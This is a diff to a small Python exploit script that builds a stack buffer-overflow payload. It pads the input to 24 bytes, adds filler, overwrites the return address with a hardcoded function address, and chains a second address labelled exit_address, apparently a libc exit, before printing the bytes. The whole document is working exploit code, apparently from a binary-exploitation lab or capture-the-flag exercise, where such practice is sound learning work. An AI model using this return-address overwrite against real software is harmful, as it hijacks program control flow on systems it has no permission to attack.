@@ -2,13 +2,16 @@ import sys
 
 shellcode = b''
 
-content = bytearray(b'a'*20)
+content = bytearray(b'a'*24)
 
-# content += b"dead"
+content += b"bbbb"
 
-ret = 0x000011bd
+echo_address = 0x000011bd
 
-content += (ret).to_bytes(4, byteorder='little')
+content += (echo_address).to_bytes(4, byteorder='little')
+
+exit_address = 0xf7c3a1f0
+content += (exit_address).to_bytes(4, byteorder='little')
 
 print(content)
 
